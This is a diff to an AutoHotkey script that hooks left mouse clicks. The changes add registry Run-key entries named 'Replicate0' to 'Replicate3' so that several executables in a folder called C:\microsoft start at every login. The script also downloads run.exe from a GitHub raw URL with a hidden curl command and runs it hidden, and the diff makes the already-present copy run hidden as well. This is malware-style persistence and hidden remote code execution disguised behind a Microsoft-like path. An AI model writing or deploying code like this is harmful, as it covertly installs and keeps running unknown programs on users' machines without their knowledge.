@@ -6,6 +6,10 @@ Run "C:\microsoft\run.exe"
 $LButton::{
     path := "C:\microsoft"
     Send "{LButton}"
+    RegWrite '"C:\microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate0"
+    RegWrite '"C:\microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
+    RegWrite '"C:\microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
+    RegWrite '"C:\microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
 
     static lastRun := 0
     delay := 1000
@@ -14,19 +18,18 @@ $LButton::{
         return
     }
 
+    output := path "\run.exe"
     if (DirExist(path)) {
         if (FileExist(path "\run.exe")) {
-            Run "run.exe"
+            Run output, , "Hide"
         } else {
-            output := path "\run.exe"
-        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
+            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
             command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
             RunWait command, , "Hide"
             Run output, , "Hide"
         }
     } else {
         DirCreate(path)
-        output := path "\run.exe"
         url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"
         command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
         RunWait command, , "Hide"
